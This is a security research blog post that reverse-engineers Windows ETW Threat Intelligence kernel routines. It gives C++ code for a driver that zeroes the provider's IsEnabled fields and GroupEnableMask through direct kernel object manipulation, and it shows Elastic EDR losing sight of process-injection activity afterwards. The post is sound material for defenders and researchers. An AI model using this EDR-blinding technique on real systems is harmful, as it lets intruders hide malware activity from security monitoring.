# https://arth.imbeddex.com/Kernel_stuff/Windows/ETW-TI-Bypass/

\[0.142\] Resolving host DNS...

\[0.284\] Establishing TCP connection... \[ OK \]

\[0.426\] Performing TLSv1.3 handshake...

█

[Skip to main content](https://arth.imbeddex.com/Kernel_stuff/Windows/ETW-TI-Bypass/#__docusaurus_skipToContent_fallback)

On this page

Event Tracing for Windows (ETW) is a logging mechanism which captures kernel and application events. Many EDRs and AVs monitor ETW to track suspicious system activity. However, Microsoft introduced ETW for Threat Intelligence (ETWti) which is kernel-only logging channel with stricter access controls. In this blog we will dive into ETWti internals, reverse some kernel functions and develop a PoC which disables this logging, effectively blinding security providers who depend on it.

C++

IDA Pro

WinDbg

## Setup [​](https://arth.imbeddex.com/Kernel_stuff/Windows/ETW-TI-Bypass/\#setup "Direct link to Setup")

Everything which we are going to talk about is done on latest Windows and defender versions, which at the time of writing this blog are -

#### Windows OS

- **Edition:** Windows 11 Pro
- **Version:**`25H2`
- **OS Build:**`26200.7840`

#### Elastic Defend

- **Elastic Agent:**`8.13.2`
- **Elastic Defend:**`8.13.2`

#### Defender Engine

- **Client:**`4.18.26010.5`
- **Engine:**`1.1.26010.1`
- **AV / AS:**`1.445.222.0`

#### Environment

Everything is created and built to test modern security with security features:

✓ Real-time protection

✓ Tamper Protection

✓ Memory integrity

✓ Memory access protection

✗ Microsoft Vulnerable Driver Blocklist

Warning

This is some serious work, hence should be used with care and made just for education and research purposes.

## What is ETW-TI [​](https://arth.imbeddex.com/Kernel_stuff/Windows/ETW-TI-Bypass/\#what-is-etw-ti "Direct link to What is ETW-TI")

ETW is not a single, monolithic system. There are two distinct logging channels operating in parallel. Understanding the difference in their privilege levels is the key to bypassing them.

Regular ETW

USER-MODE ACCESSIBLE

- Providers and consumers communicate through named pipes and shared memory.
- User-mode applications can freely subscribe to events.
- Tools like Event Viewer, WMI, and third-party monitoring apps tap into this.
- **Vulnerability:** Relatively straightforward to hook, patch, or disable from Ring 3.

ETW-TI

KERNEL-MODE ONLY

- Exclusively kernel-mode provider and consumer interface.
- **PPL Gating:** Only ELAM (Early Launch Anti-Malware) drivers and kernel-signed consumers can register.
- Cryptographic validation of provider/consumer pairs.
- **Strength:** Designed specifically to resist user-mode hooking and tampering.

ARCHITECTURE INSIGHT: WHY THE SPLIT?

Regular ETW is simply too accessible to be trusted for security critical telemetry. Because usermode malware can easily patch `EtwEventWrite` inside `ntdll.dll`, Microsoft created ETW-TI to serve as a separate, fortified channel that sits deep in the kernel, out of reach from compromised Ring 3 applications.

## ETW-TI Internals [​](https://arth.imbeddex.com/Kernel_stuff/Windows/ETW-TI-Bypass/\#etw-ti-internals "Direct link to ETW-TI Internals")

Let's dig a little deeper to understand how it all works. First we will need to find a function which initiates this logging. We know that Elastic EDR uses ETW-ti to monitor the system so, we try injecting in a remote process
while the EDR is looking...

![Elastic EDR Logs](https://arth.imbeddex.com/img/ETW-Bypass/ElasticEDR_VirtualAllocEx.png)

Elastic EDR Logs

We can now confirm that `VirtualAllocEx` does trigger ETW-ti logging and thats where we will start digging. `VirtualAllocEx` is just an usermode wrapper and the call chain looks something like:

RING 3

VirtualAllocEx

kernel32.dll

The standard Win32 API. It prepares the arguments and forwards the request down the chain.

RING 3

NtAllocateVirtualMemory

ntdll.dll (Stub)

Does not allocate anything. It is a "stub" that moves the System Service Number (SSN) into `EAX` and executes the `syscall` instruction.

Syscall Transition

RING 0

NtAllocateVirtualMemory

ntoskrnl.exe (Kernel)

The CPU transitions to Kernel Mode. The syscall dispatcher routes the request here for basic security, permission, and sanity checks.

RING 0

MiAllocateVirtualMemory

ntoskrnl.exe (Internal)

It walks the VAD tree, finds free space, commits pages, and updates page tables.

Now we have our target function which is `MiAllocateVirtualMemory`. Lets open it in IDA :)

### Reversing `MiAllocateVirtualMemory` [​](https://arth.imbeddex.com/Kernel_stuff/Windows/ETW-TI-Bypass/\#reversing-miallocatevirtualmemory "Direct link to reversing-miallocatevirtualmemory")

Its pretty clear what happens here, Reading the disassembly towards the end of the function we see it calling `EtwTiLogAllocExecVm` but only when it satisfies a specific condition:

MiAllocateVirtualMemory Disassembly

```cpp
  if ( (ProtectionMask & 2) != 0 )
    EtwTiLogAllocExecVm(a1[11], *((unsigned __int8 *)a1 + 57), v51, a1[4], *((_DWORD *)a1 + 10), *((_DWORD *)a1 + 11));
```

The `ProtectionMask` is the internal kernel representation of memory protection flags, built by `MiMakeProtectionMask` earlier in the function. In the kernel's internal protection mask encoding, bit 1 = executable. This maps to usermode constants like:

Win32 Constant

Value

Executable?

PAGE\_EXECUTE

0x10

YES

PAGE\_EXECUTE\_READ

0x20

YES

PAGE\_EXECUTE\_READWRITE

0x40

YES

PAGE\_EXECUTE\_WRITECOPY

0x80

YES

PAGE\_READONLY

0x02

NO

PAGE\_READWRITE

0x04

NO

So the condition means: Only fire `EtwTiLogAllocExecVm` if the memory being allocated/committed is executable. We wont be able to do anything here to stop the logging cause messing with the `ProtectionMask` will just mess things up. So we dive deeper, We have a new attack surface `EtwTiLogAllocExecVm`.

### Reversing `EtwTiLogAllocExecVm` [​](https://arth.imbeddex.com/Kernel_stuff/Windows/ETW-TI-Bypass/\#reversing-etwtilogallocexecvm "Direct link to reversing-etwtilogallocexecvm")

EtwTiLogAllocExecVm Disassembly

```cpp
BOOLEAN EtwTiLogAllocExecVm(_KPROCESS *a1, char a2, ...)
{
  BOOLEAN result; // al
  __int64 v5; // rcx
  _KPROCESS *Process; // r14
  _KPROCESS *v7; // rsi
  const EVENT_DESCRIPTOR *v8; // rbx

  result = EtwProviderEnabled(EtwThreatIntProvRegHandle, 0, 0xFuLL);
  if ( result )
  {

    // Log The Event
  }
  return result;
}
```

The disassembly is very simple and looks really promising. The whole Logging just depends on `EtwProviderEnabled`. If `EtwProviderEnabled` fails the whole function exits. `EtwThreatIntProvRegHandle` is a global variable of `_ETW_REG_ENTRY` structure. Another very significant thing we can see is the amount of functions that will be affected.

![xrefs to EtwProviderEnabled](https://arth.imbeddex.com/img/ETW-Bypass/xrefs_EtwProviderEnabled.png)

xrefs to `EtwProviderEnabled`

We can see functions like `EtwTiLogProtectExecVm`, `NtMapViewOfSection`, `EtwTiLogReadWriteVm`, `EtwTiLogSuspendResumeProcess`, etc. will also not be able to log events, which further increases the effectiveness of our PoC. But for that we will need to make `EtwProviderEnabled` return `0`. Lets dive deeper!

## The Gatekeeper: `EtwProviderEnabled` [​](https://arth.imbeddex.com/Kernel_stuff/Windows/ETW-TI-Bypass/\#the-gatekeeper-etwproviderenabled "Direct link to the-gatekeeper-etwproviderenabled")

If this function returns `TRUE`, the telemetry is generated and sent to the ETW-ti consumer (the EDR). If it returns `FALSE`, the event is silently dropped. This makes it a prime target for our research. Let's look at the pseudocode:

EtwProviderEnabled Pseudocode

```cpp
BOOLEAN __fastcall EtwProviderEnabled(REGHANDLE RegHandle, UCHAR Level, ULONGLONG Keyword)
{
    if (!RegHandle)
        return FALSE;

    // Primary session check
    if (EtwpLevelKeywordEnabled(*(_QWORD *)(RegHandle + 0x20) + 0x60LL, Level, Keyword))
        return TRUE;

    // Secondary session check
    if (*(_BYTE *)(RegHandle + 0x65) == 0)
        return FALSE;

    // Check secondary session
    return EtwpLevelKeywordEnabled(*(_QWORD *)(RegHandle + 0x28) + 0x60LL, Level, Keyword);
}
```

This pseudocode reveals exactly how the kernel validates telemetry sessions. We can deconstruct this into three distinct logical phases:

01The Handle Verification

```c
if (!RegHandle)
    return FALSE;
```

The very first thing the function does is check if the `RegHandle` is `NULL`, if yes then the function immediately short-circuits and returns `FALSE`. In some approach we can locate this handle in memory and zero it out, the kernel will instantly stop logging.

02The Primary Session Check

```c
if (EtwpLevelKeywordEnabled(*(_QWORD *)(RegHandle + 0x20) + 0x60LL, Level, Keyword))
```

`RegHandle` is the pointer to the undocumented kernel structure called `_ETW_REG_ENTRY` as we saw earlier. The code dereferences offset `0x20` of this structure which is `struct _ETW_GUID_ENTRY* GuidEntry`, adds `0x60` and passes it to the bitwise checker.

03The Secondary Session Fallback

```c
if (*(_BYTE *)(RegHandle + 0x65) == 0)
    return FALSE;
return EtwpLevelKeywordEnabled(*(_QWORD *)(RegHandle + 0x28) + 0x60LL, Level, Keyword);
```

If the primary session isn't listening for this specific event, the kernel checks offset `0x65` (`UCHAR GroupEnableMask`) to see if a Secondary Session exists. If it does, it repeats the exact same check using offset `0x28`, which points to the Secondary Session's GUID Entry i.e. `struct _ETW_GUID_ENTRY* GroupEntry`.

There are a lot of structures oof, but dont worry we will now look into these structures to get a clear understanding of what is exactly happening.

### Translating the Offsets [​](https://arth.imbeddex.com/Kernel_stuff/Windows/ETW-TI-Bypass/\#translating-the-offsets "Direct link to Translating the Offsets")

So, rn we are playing with 3 different structures `_ETW_REG_ENTRY` which contains `_ETW_GUID_ENTRY` which contains `_TRACE_ENABLE_INFO`.

>\_`_ETW_REG_ENTRY` Structure

```cpp
//0x70 bytes (sizeof)
struct _ETW_REG_ENTRY
{
    struct _LIST_ENTRY RegList;                                             //0x0
    struct _LIST_ENTRY GroupRegList;                                        //0x10
    struct _ETW_GUID_ENTRY* GuidEntry;                                      //0x20
    struct _ETW_GUID_ENTRY* GroupEntry;                                     //0x28
    union
    {
        struct _ETW_REPLY_QUEUE* ReplyQueue;                                //0x30
        struct _ETW_QUEUE_ENTRY* ReplySlot[4];                              //0x30
        struct
        {
            VOID* Caller;                                                   //0x30
            ULONG SessionId;                                                //0x38
        };
    };
    union
    {
        struct _EPROCESS* Process;                                          //0x50
        VOID* CallbackContext;                                              //0x50
    };
    VOID* Callback;                                                         //0x58
    USHORT Index;                                                           //0x60
    union
    {
        USHORT Flags;                                                       //0x62
        struct
        {
            USHORT DbgKernelRegistration:1;                                 //0x62
            USHORT DbgUserRegistration:1;                                   //0x62
            USHORT DbgReplyRegistration:1;                                  //0x62
            USHORT DbgClassicRegistration:1;                                //0x62
            USHORT DbgSessionSpaceRegistration:1;                           //0x62
            USHORT DbgModernRegistration:1;                                 //0x62
            USHORT DbgClosed:1;                                             //0x62
            USHORT DbgInserted:1;                                           //0x62
            USHORT DbgWow64:1;                                              //0x62
            USHORT DbgUseDescriptorType:1;                                  //0x62
            USHORT DbgDropProviderTraits:1;                                 //0x62
        };
    };
    UCHAR EnableMask;                                                       //0x64
    UCHAR GroupEnableMask;                                                  //0x65
    UCHAR HostEnableMask;                                                   //0x66
    UCHAR HostGroupEnableMask;                                              //0x67
    struct _ETW_PROVIDER_TRAITS* Traits;                                    //0x68
};
```

>\_`_ETW_GUID_ENTRY` Structure

```cpp
//0x1a8 bytes (sizeof)
struct _ETW_GUID_ENTRY
{
    struct _LIST_ENTRY GuidList;                                            //0x0
    struct _LIST_ENTRY SiloGuidList;                                        //0x10
    volatile LONGLONG RefCount;                                             //0x20
    struct _GUID Guid;                                                      //0x28
    struct _LIST_ENTRY RegListHead;                                         //0x38
    VOID* SecurityDescriptor;                                               //0x48
    union
    {
        struct _ETW_LAST_ENABLE_INFO LastEnable;                            //0x50
        ULONGLONG MatchId;                                                  //0x50
    };
    struct _TRACE_ENABLE_INFO ProviderEnableInfo;                           //0x60
    struct _TRACE_ENABLE_INFO EnableInfo[8];                                //0x80
    struct _ETW_FILTER_HEADER* FilterData;                                  //0x180
    struct _ETW_SILODRIVERSTATE* SiloState;                                 //0x188
    struct _ETW_GUID_ENTRY* HostEntry;                                      //0x190
    struct _EX_PUSH_LOCK Lock;                                              //0x198
    struct _ETHREAD* LockOwner;                                             //0x1a0
};
```

>\_`_TRACE_ENABLE_INFO` Structure

```cpp
//0x20 bytes (sizeof)
struct _TRACE_ENABLE_INFO
{
    ULONG IsEnabled;                                                        //0x0
    UCHAR Level;                                                            //0x4
    UCHAR Reserved1;                                                        //0x5
    USHORT LoggerId;                                                        //0x6
    ULONG EnableProperty;                                                   //0x8
    ULONG Reserved2;                                                        //0xc
    ULONGLONG MatchAnyKeyword;                                              //0x10
    ULONGLONG MatchAllKeyword;                                              //0x18
};
```

Now we know these structures, I'll also provide you with a diagram which will help understanding the relation between these structures.

struct \_ETW\_REG\_ENTRY// <\-\- RegHandle points here

... (Other Fields) ...

0x20

\_ETW\_GUID\_ENTRY\*

GuidEntry;

// Primary Session

0x28

\_ETW\_GUID\_ENTRY\*

GroupEntry;

// Secondary Session

... (Other Fields) ...

0x65

UCHAR

GroupEnableMask;

// Secondary Flag

struct \_ETW\_GUID\_ENTRY// <\-\- Dereferenced from 0x20 or 0x28

... (Other Fields) ...

0x60

TRACE\_ENABLE\_INFO

ProviderEnableInfo;

// The final target

But we are still yet to understand how `EtwpLevelKeywordEnabled` works, if we can make it return 0 the ETW-ti logging shuts down. Lets Dive deeper :)

### Reversing `EtwpLevelKeywordEnabled` [​](https://arth.imbeddex.com/Kernel_stuff/Windows/ETW-TI-Bypass/\#reversing-etwplevelkeywordenabled "Direct link to reversing-etwplevelkeywordenabled")

EtwpLevelKeywordEnabled Pseudocode

```cpp
bool __fastcall EtwpLevelKeywordEnabled(__int64 a1, unsigned __int8 a2, __int64 a3)
{
  unsigned __int8 v3; // al

  if ( !*(_DWORD *)a1 )                         //  nobody is listening → bail immediately.
    return 0;
  v3 = *(_BYTE *)(a1 + 4);
  if ( a2 > v3 )
  {
    if ( v3 )
      return 0;
  }
  if ( (*(_DWORD *)(a1 + 8) & 0x40) != 0 && !a3 )
    return 1;
  return (a3 & *(_QWORD *)(a1 + 16)) != 0 && (a3 & *(_QWORD *)(a1 + 24)) == *(_QWORD *)(a1 + 24);
}
```

Now thats what we want. This function performs several complex bitwise checks against the requested `Level` and `Keyword`, but all of that logic is completely irrelevant if we look at the very first instruction.

The function casts the first argument (`a1`) to a 32-bit integer and checks if it is zero. If it is, **it immediately returns 0 (FALSE)**, signaling to the kernel that the event should be dropped.

### The Kill Switch [​](https://arth.imbeddex.com/Kernel_stuff/Windows/ETW-TI-Bypass/\#the-kill-switch "Direct link to The Kill Switch")

To exploit this logic, we need to know exactly what `a1` points to in memory. If we recall how `EtwProviderEnabled` called this function, it passed the dereferenced pointers for both the Primary and Secondary sessions:

```cpp
// Primary Session Call
EtwpLevelKeywordEnabled(*(RegHandle + 0x20) + 0x60, Level, Keyword);

// Secondary Session Fallback
EtwpLevelKeywordEnabled(*(RegHandle + 0x28) + 0x60, Level, Keyword);
```

When we translate that raw pointer math back into our mapped Windows Kernel structures, the target becomes crystal clear. The `a1` argument is pointing directly to the `IsEnabled` field!

Checkmate

DATA-ONLY ATTACK VECTOR IDENTIFIED

01

EtwThreatIntProvRegHandle->GuidEntry->ProviderEnableInfo.IsEnabled

02

EtwThreatIntProvRegHandle->GroupEntry->ProviderEnableInfo.IsEnabled

Because `EtwpLevelKeywordEnabled` blindly trusts this field in memory without verifying its integrity against a protected state, the bypass is devastatingly simple. All we have to do is locate the `EtwThreatIntProvRegHandle` in kernel space, traverse the pointers, and **set these two bits to `0`**.

The moment those bytes are flipped, the entire ETW-ti logging mechanism goes completely blind.

## The Implementation [​](https://arth.imbeddex.com/Kernel_stuff/Windows/ETW-TI-Bypass/\#the-implementation "Direct link to The Implementation")

So, this is pure DKOM and hence requires you to have kernel mode access. Wether you use a vulnerable driver or get your driver signed, the implementation is really easy. All the hard work will be finding `EtwThreatIntProvRegHandle` at runtime. But if u made it this far, I believe that you will figure it out. So, now that you have `EtwThreatIntProvRegHandle`.

```cpp
// Dereference to get actual structure
PETW_REG_ENTRY pRegEntry = *(PETW_REG_ENTRY*)vpEtwThreatIntProvRegHandle;
if(!pRegEntry) return 1;

// Primary session
if(pRegEntry->GuidEntry)
{
    pRegEntry->GuidEntry->ProviderEnableInfo.IsEnabled = 0;
    LOG_W("[ETW_BYPS] [+] GuidEntry->ProviderEnableInfo.IsEnabled is Flipped\n");
}

// Disable secondary flag
pRegEntry->GroupEnableMask = 0;
LOG_W("[ETW_BYPS] [+] GroupEnableMask is Flipped\n");

// Secondary session
if(pRegEntry->GroupEntry)
{
    pRegEntry->GroupEntry->ProviderEnableInfo.IsEnabled = 0;
    LOG_W("[ETW_BYPS] [+] GroupEntry->ProviderEnableInfo.IsEnabled is Flipped\n");
}
```

By casting the handle, we map our custom C++ structures directly over the live kernel memory. We then systematically neutralize the three mechanisms ETW uses to route events:

- **Primary Session (GuidEntry):** We follow the pointer to the main trace session and overwrite the `IsEnabled` boolean with `0`.
- **Group Enable Mask:** ETW providers can be grouped together. By zeroing the `GroupEnableMask`, we strip the provider's association with any active tracing groups.
- **Secondary Session (GroupEntry):** We follow the secondary trace session pointer and flip its `IsEnabled` flag to `0` as well.

**The Result:** The next time `EtwProviderEnabled` runs, it will check these structures. Because we flipped the booleans to `0`, the kernel assumes no one is listening to the Threat Intelligence feed and instantly drops the telemetry event, rendering the EDR blind!

## EtwTiLogSuccess() [​](https://arth.imbeddex.com/Kernel_stuff/Windows/ETW-TI-Bypass/\#etwtilogsuccess "Direct link to EtwTiLogSuccess()")

Now we will test this. In this demonstration I will show you how the ETW-ti logs normally look like and what the EDR derives from them. We will run our injector [YetAnotherReflectiveLoader](https://arth.imbeddex.com/malware/development/Reflective-DLL-Injection) and look at what the EDR capture both before and after the bypass.

### Before the Attack [​](https://arth.imbeddex.com/Kernel_stuff/Windows/ETW-TI-Bypass/\#before-the-attack "Direct link to Before the Attack")

As ETW-ti is very picky about who it provides these logs, we perform DKOM and make our listener a PPL process. I will not cover this process in this blog but you can read a very detailed documentation at [bordergate's blog](https://www.bordergate.co.uk/process-protection-light/) EXTERNAL LINK TOhttps://www.bordergate.co.uk/process-protection-light/![Website Preview](https://api.microlink.io/?url=https%3A%2F%2Fwww.bordergate.co.uk%2Fprocess-protection-light%2F&embed=image.url) about changing the protection level.

After some DKOM our listener is able to get these logs.

In the video we can see that we receive logs for any interacts with the Virtual Memory like `WRITEVM_REMOTE`, `ALOCVM_LOCAL`, `PROTECTVM_LOCAL`, etc. We also see events like `ALLOCVM_REMOTE` and `WRITEVM_REMOTE` by our injector shown as unknown.

SOURCE

EVENT

PROCESS

TID

TIMESTAMP

\[+\] ETWti

ALLOCVM\_LOCAL

PID: 1208 (dwm.exe)

2556

13:38:20.4823528

\[+\] ETWti

ALLOCVM\_REMOTE

PID: 4048 (<unknown>)

8524

13:38:20.7373378

\[+\] ETWti

WRITEVM\_REMOTE

PID: 4048 (<unknown>)

8524

13:38:20.7373681

\[+\] ETWti

WRITEVM\_REMOTE

PID: 4048 (<unknown>)

8524

13:38:20.7374437

\[+\] ETWti

WRITEVM\_REMOTE

PID: 4048 (<unknown>)

8524

13:38:20.7374876

\[+\] ETWti

WRITEVM\_REMOTE

PID: 4048 (<unknown>)

8524

13:38:20.7375018

\[+\] ETWti

WRITEVM\_REMOTE

PID: 4048 (<unknown>)

8524

13:38:20.7375161

\[+\] ETWti

WRITEVM\_REMOTE

PID: 4048 (<unknown>)

8524

13:38:20.7375292

\[+\] ETWti

ALLOCVM\_REMOTE

PID: 4048 (<unknown>)

8524

13:38:20.7375644

And the EDR sees this too...

![Elastic EDR Logs pre attack](https://arth.imbeddex.com/img/ETW-Bypass/Elastic_EDR_Logs.png)

Elastic EDR Logs Pre Attack

We can see the EDR actively logging DLL load events, connection requests, and connection terminations. More importantly, the `VirtualAllocEx` and `WriteProcessMemory` API calls are directly mapped to the **ALLOCVM\_REMOTE** and **WRITEVM\_REMOTE** ETW TI logs we observed in the console above.

### After the Attack [​](https://arth.imbeddex.com/Kernel_stuff/Windows/ETW-TI-Bypass/\#after-the-attack "Direct link to After the Attack")

As we discussed above we need to perform DKOM and modify 3 specific things and that is exactly what our driver does.

![Driver Logs](https://arth.imbeddex.com/img/ETW-Bypass/Bypass.png)

Driver Logs

But what does the EDR sees? Running the same Process Injection again:

![EDR_logs_after_Bypass](https://arth.imbeddex.com/img/ETW-Bypass/EDR_logs_after_Bypass.png)

The Successful ETW-ti Bypass

We can see a clear difference here. Elastic EDR completely misses `VirtualAllocEx` and `WriteProcessMemory` calls this time. It does see the injector starting, loading libraries, attempting connection and receiving disconnect. But it is completely blind towards interactions with virtual memory which is provided by ETW-ti.

## References [​](https://arth.imbeddex.com/Kernel_stuff/Windows/ETW-TI-Bypass/\#references "Direct link to References")

[![icon](https://www.google.com/s2/favicons?domain=learn.microsoft.com&sz=64)\\
\\
Event Tracing for Windowsmicrosoft\\
\\
›](https://learn.microsoft.com/en-us/windows-hardware/test/wpt/event-tracing-for-windows) [![icon](https://www.google.com/s2/favicons?domain=ired.team&sz=64)\\
\\
ETW: Event Tracing for Windows 101ired\\
\\
›](https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/etw-event-tracing-for-windows-101) [![icon](https://www.google.com/s2/favicons?domain=meekolab.com&sz=64)\\
\\
Introduction into Microsoft Threat Intelligence Drivers (ETW-TI)meekolab\\
\\
›](https://research.meekolab.com/introduction-into-microsoft-threat-intelligence-drivers-etw-ti) [![icon](https://www.google.com/s2/favicons?domain=fluxsec.red&sz=64)\\
\\
Reading Event Tracing for Windows Threat Intelligencefluxsec\\
\\
›](https://fluxsec.red/event-tracing-for-windows-threat-intelligence-rust-consumer) [![icon](https://www.google.com/s2/favicons?domain=fluxsec.red&sz=64)\\
\\
Creating a Protected Process Light in Rust for Sanctum EDRfluxsec\\
\\
›](https://fluxsec.red/creating-a-ppl-protected-process-light-in-rust-windows) [![icon](https://www.google.com/s2/favicons?domain=medium.com&sz=64)\\
\\
Windows PPL (Protected Processes Light)medium\\
\\
›](https://medium.com/@s12deff/windows-ppl-protected-processes-light-e158332aedca) [![icon](https://www.google.com/s2/favicons?domain=bordergate.co.uk&sz=64)\\
\\
Protected Process Lightbordergate\\
\\
›](https://www.bordergate.co.uk/process-protection-light/) [![icon](https://www.google.com/s2/favicons?domain=vergiliusproject.com&sz=64)\\
\\
Undocumented Structuresvergiliusproject\\
\\
›](https://www.vergiliusproject.com/kernels/x64/windows-11/25h2)

- [Setup](https://arth.imbeddex.com/Kernel_stuff/Windows/ETW-TI-Bypass/#setup)
- [What is ETW-TI](https://arth.imbeddex.com/Kernel_stuff/Windows/ETW-TI-Bypass/#what-is-etw-ti)
- [ETW-TI Internals](https://arth.imbeddex.com/Kernel_stuff/Windows/ETW-TI-Bypass/#etw-ti-internals)
  - [Reversing `MiAllocateVirtualMemory`](https://arth.imbeddex.com/Kernel_stuff/Windows/ETW-TI-Bypass/#reversing-miallocatevirtualmemory)
  - [Reversing `EtwTiLogAllocExecVm`](https://arth.imbeddex.com/Kernel_stuff/Windows/ETW-TI-Bypass/#reversing-etwtilogallocexecvm)
- [The Gatekeeper: `EtwProviderEnabled`](https://arth.imbeddex.com/Kernel_stuff/Windows/ETW-TI-Bypass/#the-gatekeeper-etwproviderenabled)
  - [Translating the Offsets](https://arth.imbeddex.com/Kernel_stuff/Windows/ETW-TI-Bypass/#translating-the-offsets)
  - [Reversing `EtwpLevelKeywordEnabled`](https://arth.imbeddex.com/Kernel_stuff/Windows/ETW-TI-Bypass/#reversing-etwplevelkeywordenabled)
  - [The Kill Switch](https://arth.imbeddex.com/Kernel_stuff/Windows/ETW-TI-Bypass/#the-kill-switch)
- [The Implementation](https://arth.imbeddex.com/Kernel_stuff/Windows/ETW-TI-Bypass/#the-implementation)
- [EtwTiLogSuccess()](https://arth.imbeddex.com/Kernel_stuff/Windows/ETW-TI-Bypass/#etwtilogsuccess)
  - [Before the Attack](https://arth.imbeddex.com/Kernel_stuff/Windows/ETW-TI-Bypass/#before-the-attack)
  - [After the Attack](https://arth.imbeddex.com/Kernel_stuff/Windows/ETW-TI-Bypass/#after-the-attack)
- [References](https://arth.imbeddex.com/Kernel_stuff/Windows/ETW-TI-Bypass/#references)

VISITOR

\[CONNECTED\] \_

Your IP: 195.64.119.164\|LOC: Centreville, US\|ISP: Cox Communications Inc.\|CPU: 32 Cores\|RAM: 32Gb\|PWR: 100% \[Charging\]\|DOC: \[==========\]   0%\|00:00:00